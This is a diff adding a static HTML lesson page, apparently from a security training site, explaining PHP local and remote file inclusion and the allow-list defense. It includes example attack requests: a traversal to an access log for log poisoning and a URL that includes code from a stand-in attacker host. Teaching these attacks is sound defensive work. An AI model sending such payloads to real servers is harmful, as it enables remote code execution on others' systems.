@@ -1,0 +1,113 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Local &amp; Remote File Inclusion (LFI/RFI) — Path 11 · KashSec Academy</title>
+<meta name="description" content="The path-traversal lesson covered reading files outside an intended directory. This lesson covers a related but more dangerous variant, common specifically in dynamically-typed, file-including languag">
+<link rel="canonical" href="https://kashsec.vercel.app/#/lesson/11-web-security/file-inclusion-lfi-rfi">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E🛡%3C/text%3E%3C/svg%3E">
+<meta property="og:title" content="Local &amp; Remote File Inclusion (LFI/RFI) — Path 11 · KashSec Academy">
+<meta property="og:description" content="The path-traversal lesson covered reading files outside an intended directory. This lesson covers a related but more dangerous variant, common specifically in dynamically-typed, file-including languag">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://kashsec.vercel.app/#/lesson/11-web-security/file-inclusion-lfi-rfi">
+<meta property="og:image" content="https://kashsec.vercel.app/og-image.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Local &amp; Remote File Inclusion (LFI/RFI) — Path 11 · KashSec Academy">
+<meta name="twitter:description" content="The path-traversal lesson covered reading files outside an intended directory. This lesson covers a related but more dangerous variant, common specifically in dynamically-typed, file-including languag">
+<meta name="twitter:image" content="https://kashsec.vercel.app/og-image.png">
+<meta name="theme-color" content="#0A0E13">
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"LearningResource","name":"Local & Remote File Inclusion (LFI/RFI) — Path 11 · KashSec Academy","description":"The path-traversal lesson covered reading files outside an intended directory. This lesson covers a related but more dangerous variant, common specifically in dynamically-typed, file-including languag","url":"https://kashsec.vercel.app/#/lesson/11-web-security/file-inclusion-lfi-rfi","provider":{"@type":"Organization","name":"KashSec Academy","url":"https://kashsec.vercel.app"},"isAccessibleForFree":true,"learningResourceType":"Lesson"}
+</script>
+<style>
+:root{color-scheme:dark;--bg:#080A0F;--surface:#0F141E;--text:#EAEFF5;--muted:#94A3B2;--amber:#EFA43A;--teal:#5FE0CF;--border:rgba(255,255,255,.08)}
+html,body{margin:0;padding:0;background:var(--bg);color:var(--text);font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;line-height:1.6}
+main{max-width:760px;margin:0 auto;padding:1.5rem 1.2rem 3rem}
+.spa-notice{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:.9rem 1.1rem;margin-bottom:1.5rem;color:var(--muted);font-size:.88rem}
+.spa-notice a{color:var(--amber);text-decoration:none;font-weight:600}
+.crumb{color:var(--muted);font-size:.8rem;margin-bottom:.4rem}
+.crumb a{color:var(--teal);text-decoration:none}
+h1,h2,h3,h4{font-family:Inter,system-ui,sans-serif;color:var(--text)}
+h1{font-size:2rem;margin:.5rem 0 1rem}
+h2{font-size:1.4rem;margin:2rem 0 .8rem;padding-top:.6rem;border-top:1px solid var(--border)}
+a{color:var(--teal)}
+code{background:rgba(63,182,168,.13);color:var(--teal);padding:.1rem .35rem;border-radius:4px;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:.9em}
+pre{background:#050810;border:1px solid var(--border);border-radius:10px;padding:1rem;overflow-x:auto}
+pre code{background:transparent;color:var(--text);padding:0}
+blockquote{border-left:3px solid var(--amber);margin:1rem 0;padding:.4rem 1rem;color:var(--muted);background:var(--surface);border-radius:6px}
+table{width:100%;border-collapse:collapse;margin:1rem 0}
+th,td{border:1px solid var(--border);padding:.5rem .7rem;text-align:left}
+th{background:var(--surface)}
+img{max-width:100%;height:auto}
+footer{color:var(--muted);font-size:.82rem;text-align:center;margin-top:3rem;padding-top:1.5rem;border-top:1px solid var(--border)}
+</style>
+</head>
+<body>
+<main>
+  <div class="spa-notice">📱 Loading the interactive KashSec app… If it doesn't switch automatically, <a href="https://kashsec.vercel.app/#/lesson/11-web-security/file-inclusion-lfi-rfi">continue here →</a></div>
+  <div class="crumb"><a href="/">KashSec Academy</a> · <a href="/">Path 11 — Web Security & Hacking</a> · Local &amp; Remote File Inclusion (LFI/RFI)</div>
+  <article><h1>Local &amp; Remote File Inclusion (LFI/RFI)</h1>
+<p>The path-traversal lesson covered reading files outside an intended directory. This lesson covers a related but more dangerous variant, common specifically in dynamically-typed, file-including languages like PHP: getting the server to actually <em>execute</em> a file, not just read it.</p>
+<h2>What file inclusion actually is</h2>
+<p>Some server-side languages support dynamically including and <em>executing</em> another file&#39;s code based on a variable:</p>
+<pre><code class="language-php">&lt;?php
+$page = $_GET[&#39;page&#39;];
+include($page . &quot;.php&quot;);
+?&gt;
+</code></pre>
+<p>This pattern — genuinely common in older PHP applications for building modular page templates — becomes exploitable the moment the <code>page</code> parameter isn&#39;t strictly validated against an allow-list.</p>
+<h2>LFI: Local File Inclusion</h2>
+<p><strong>LFI</strong> exploits this pattern using the path-traversal technique from earlier in this path, but with a critical difference from plain path traversal: instead of just <em>reading</em> a file&#39;s raw content, the included file&#39;s code actually <em>executes</em>:</p>
+<pre><code>GET /index.php?page=../../../../var/log/apache2/access.log
+</code></pre>
+<p>If an attacker can get attacker-controlled content into a file the server will subsequently include (even indirectly — log poisoning, planting PHP code inside a User-Agent header that later gets logged, then including that log file), the &quot;included&quot; content executes as genuine server-side PHP code, turning a file-read primitive into full code execution.</p>
+<h2>RFI: Remote File Inclusion</h2>
+<p><strong>RFI</strong> is the more directly dangerous variant, where the include mechanism accepts a full URL rather than just a local path:</p>
+<pre><code>GET /index.php?page=http://attacker.com/malicious.txt
+</code></pre>
+<p>If the server fetches and executes this remote file directly, the attacker has achieved immediate, complete remote code execution with no local file-planting step required at all — genuinely one of the most severe outcomes possible from a single vulnerable parameter, though RFI is less common today since most modern PHP configurations disable remote file inclusion by default.</p>
+<h2>Why this connects directly to command injection</h2>
+<p>Recall the cmd-and-upload lesson&#39;s framing: file inclusion is &quot;two paths to server takeover,&quot; and file inclusion is genuinely one of them — the end result (arbitrary code execution on the server) is functionally identical to a successful command injection, even though the specific mechanism getting there is completely different.</p>
+<h2>The defense: allow-lists, not blocklists</h2>
+<pre><code class="language-php">&lt;?php
+$allowed_pages = [&#39;home&#39;, &#39;about&#39;, &#39;contact&#39;];
+$page = $_GET[&#39;page&#39;];
+if (in_array($page, $allowed_pages)) {
+    include($page . &quot;.php&quot;);
+}
+?&gt;
+</code></pre>
+<p>Exactly mirroring the path-traversal lesson&#39;s core lesson: validating against a specific, known-good allow-list of legitimate values closes this vulnerability structurally, rather than trying to filter out every possible malicious path or URL pattern after the fact.</p>
+<p>Why is RFI generally considered more severe than LFI, even though both stem from the same underlying vulnerable code pattern?</p>
+<details><summary>Show answer</summary>LFI requires the attacker to first find a way to get their malicious code planted somewhere <em>on the server's own filesystem</em> before they can include and execute it — through a file upload, log poisoning, or another separate vulnerability — meaning LFI alone is often just one step in a longer exploitation chain. RFI, by contrast, lets the attacker directly specify a URL pointing to <em>their own, externally-hosted</em> malicious file, achieving code execution in a single request with no separate file-planting step required at all — the attacker doesn't need to find any other way onto the server first, they simply point the vulnerable include statement directly at content they already fully control. This is exactly why RFI represents a more immediately severe, single-step path to complete server compromise, even though modern server configurations increasingly disable the specific setting that makes RFI possible by default.</details><h2>Key terms</h2>
+<ul>
+<li><strong>LFI (Local File Inclusion)</strong> — exploiting a dynamic include statement to execute a local file&#39;s content as server-side code.</li>
+<li><strong>RFI (Remote File Inclusion)</strong> — exploiting a dynamic include statement to execute code from an attacker-controlled remote URL.</li>
+<li><strong>Log poisoning</strong> — planting malicious code inside a log file (via a header or input that gets logged) so it can later be triggered through LFI.</li>
+</ul>
+<h2>Recap</h2>
+<ul>
+<li>File inclusion vulnerabilities turn a dynamic include statement into arbitrary code execution, a meaningfully more severe outcome than plain path traversal&#39;s file-read alone.</li>
+<li>LFI typically requires a separate step to plant malicious content on the server first; RFI allows direct execution of attacker-hosted remote code in a single request.</li>
+<li>Allow-listing legitimate values, exactly mirroring the path-traversal lesson&#39;s defense, closes this vulnerability class structurally.</li>
+</ul>
+<p><strong>Next up →</strong> <a href="#/lesson/11-web-security/deserialization-attacks">Deserialization Attacks</a></p>
+</article>
+  <footer>© KashSec Academy · <a href="/">Interactive site</a> · <a href="/sitemap.xml">Sitemap</a></footer>
+</main>
+<script>
+// Redirect actual users into the SPA. Search-engine crawlers get to read
+// the content above before the redirect fires.
+(function(){
+  try {
+    var target = "https://kashsec.vercel.app/#/lesson/11-web-security/file-inclusion-lfi-rfi";
+    // Only redirect from the .html file, not from the SPA route itself.
+    if (location.pathname.endsWith('.html')) location.replace(target);
+  } catch (e) {}
+})();
+</script>
+</body>
+</html>
